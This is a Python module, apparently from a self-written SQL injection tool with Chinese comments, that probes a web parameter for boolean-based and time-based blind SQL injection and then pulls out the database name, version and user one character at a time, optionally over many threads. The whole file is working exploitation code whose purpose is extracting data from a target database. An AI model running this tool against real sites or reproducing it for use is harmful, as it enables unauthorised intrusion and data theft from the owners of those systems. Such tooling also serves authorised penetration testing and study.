from lib.core.settings import BOUNDARIES_FILE_NAME
from lib.core.settings import DATA_FILE_NAME
from lib.core.settings import BOOLEAN_FILE_NAME
from lib.core.settings import TIME_FILE_NAME
from lib.core.settings import BLIND_THREAD
from data.json_file import get_json
from itertools import chain
import random
import string
from lib.utils.thread_queue import MyTask,MyThread
from lib.utils.cache import Cache
from lib.core.settings import SQLITE_FILE_NAME
import queue

class CheckBlind():
    def __init__(self, urls, id, db, top_boundaries, log):
        self.urls = urls
        self.db = db
        self.id = id
        self.log = log
        self.param = self.urls.params[id]
        self.top_boundaries = top_boundaries
        self.boundaries = get_json(BOUNDARIES_FILE_NAME, "low")   
        self.bool_payloads = get_json(BOOLEAN_FILE_NAME, self.db)
        self.time_payloads = get_json(TIME_FILE_NAME, self.db)
        self.data_payloads = get_json(DATA_FILE_NAME, self.db)

    def check_bool_blind(self):
        '''
            遍历所有检查是否能注数据
            returns: payload
        '''
        test_data = "'test'"
        for payload_dict in self.bool_payloads:
            true_payload = payload_dict["payload"].replace('[DATA]', test_data).replace('[POSITION]', '2').replace('[DATANUM]', '101')
            false_payload = true_payload.replace('101', '102')
            true_url = self.urls.http_payload(self.param, true_payload, self.top_boundaries)
            false_url = self.urls.http_payload(self.param, false_payload, self.top_boundaries)
            if self.urls.check_url_page(self.id, true_url) and not self.urls.check_url_page(self.id, false_url):
                return payload_dict["payload"]
        return False

    def get_data_len(self, data_payload):
        '''
            获取数据长度
            returns: length
        '''
        for i in range(1,30):
            # 遍历1到30 
            if self.db == "mssql":
                payload = "and(len("+data_payload+")=%s)" %i
            else:
                payload = "and(length("+data_payload+")=%s)" %i
            url = self.urls.http_payload(self.param, payload, self.top_boundaries)
            if self.urls.check_url_page(self.id, url):
                return i
        return 10

    def show_basic_data(self, payload, data_type):
        '''
            返回数据库版本号,用户,数据库名
            returns: []
        '''
        # 先获取数据长度
        data_payload = self.data_payloads[data_type]
        data_len = self.get_data_len(data_payload)
        data_str = ""
        data_list = [None]*data_len
        queue_length = data_len
        my__queue = queue.LifoQueue(queue_length)
        threads = []        
        # print(data_len)
        # 逐个数据爆破
        for i in range(1, data_len + 1):
            mt = MyTask(self.urls, payload, data_payload, self.id, self.top_boundaries, self.param, i)
            my__queue.put_nowait(mt)

        for k in range(queue_length):
            mtd = MyThread(my__queue, "bool")
            threads.append(mtd)

        for k in range(queue_length):
            threads[k].start()

        for k in range(queue_length):
            threads[k].join()

        for k in range(queue_length):
            the_result = threads[k].result
            if the_result is not None:
                data_list[the_result[0]-1] = chr(the_result[1])
                continue
                # data_str = data_str + chr(the_result)
        data_str = ''.join(data_list)
        return data_str

    def check_time_blind(self):
        '''
            遍历所有payload检查是否能注数据
            returns: payload
        '''
        test_data = "'test'"
        for payload_dict in self.time_payloads:
            true_payload = payload_dict["payload"].replace('[DATA]', test_data).replace('[POSITION]', '2').replace('[DATANUM]', '101')
            false_payload = true_payload.replace('101', '102')
            true_url = self.urls.http_payload(self.param, true_payload, self.top_boundaries)
            false_url = self.urls.http_payload(self.param, false_payload, self.top_boundaries)
            if self.urls.check_url_time(true_url) and not self.urls.check_url_time(false_url):
                return payload_dict
        return False

    def get_time_data_len(self, payload, data_payload):
        '''
            用时间盲注判断长度
            returns: length
        '''
        for i in range(1,30):
            length_payload = payload["length_payload"].replace('[DATA]', data_payload).replace('[DATANUM]', str(i))
            url = self.urls.http_payload(self.param, length_payload, self.top_boundaries)
            if self.urls.check_url_time(url):
                return i
        return 10

    def show_time_basic_data(self, payload, data_type):
        '''
            返回数据库版本号,用户,数据库名
            returns: []
        '''
        # 先获取数据长度
        data_payload = self.data_payloads[data_type]
        data_len = self.get_time_data_len(payload, data_payload)
        data_str = ""
        data_list = [None]*data_len
        queue_length = data_len
        my__queue = queue.LifoQueue(queue_length)
        threads = []
        # 判断是否要启动多线程检测机制
        if BLIND_THREAD:
            for i in range(1, data_len + 1):
                # 遍历ascii->32-123
                # 队列长度,即最大线程数
                # 先进后出队列
                mt = MyTask(self.urls, payload, data_payload, self.id, self.top_boundaries, self.param, i)
                my__queue.put_nowait(mt)

            for k in range(queue_length):
                mtd = MyThread(my__queue, "time")
                threads.append(mtd)

            for k in range(queue_length):
                threads[k].start()

            for k in range(queue_length):
                threads[k].join()

            for k in range(queue_length):
                the_result = threads[k].result
                if the_result is not None:
                    data_list[the_result[0]-1] = chr(the_result[1])
                    continue
            data_str = ''.join(data_list)
            return data_str
        else:
            for i in range(1, data_len + 1):
                # 遍历ascii->60-122
                for j in range(32,123):
                    true_payload = payload["payload"].replace('[DATA]', data_payload).replace('[POSITION]', str(i)).replace('[DATANUM]', str(j))
                    true_url = self.urls.http_payload(self.param, true_payload, self.top_boundaries)
                    if self.urls.check_url_time(true_url):
                        data_str = data_str + chr(j)
                        continue
            return data_str

    def detected(self, sql_type):
        '''
            主函数
        '''
        if sql_type == "bool":
            bool_payload = self.check_bool_blind()
            if bool_payload:
                if BLIND_THREAD:
                    self.log.info("正在启动多线程爆破机制")
                self.log.debug("检测出注入类型为布尔盲注,检测结果如下:")
                self.log.debug("爆出的数据库名为:%s" %self.show_basic_data(bool_payload, "db_name"))
                self.log.debug("爆出的数据库版本号为:%s" %self.show_basic_data(bool_payload, "db_version"))
                self.log.debug("爆出的数据库用户名为:%s" %self.show_basic_data(bool_payload, "user_name"))
                self.log.warning("检测完毕")
                # self.log.debug((self.db, self.top_boundaries, "bool_query"))
                # cache = Cache(SQLITE_FILE_NAME)
                # cache.insert(self.urls.url, self.db, self.top_boundaries, "bool_query")
                return True

        elif sql_type == "time":
            time_payload = self.check_time_blind()
            if time_payload:
                if BLIND_THREAD:
                    self.log.info("正在启动多线程爆破机制")
                self.log.debug("检测出注入类型为时间盲注,检测结果如下:")
                self.log.debug("爆出的数据库名为:%s" %self.show_time_basic_data(time_payload, "db_name"))
                self.log.debug("爆出的数据库版本号为:%s" %self.show_time_basic_data(time_payload, "db_version"))
                self.log.debug("爆出的数据库用户名为:%s" %self.show_time_basic_data(time_payload, "user_name"))
                self.log.warning("检测完毕")
                # cache = Cache(SQLITE_FILE_NAME)
                # cache.insert(self.urls.url, self.db, self.top_boundaries, "time_query")
                return True
        return False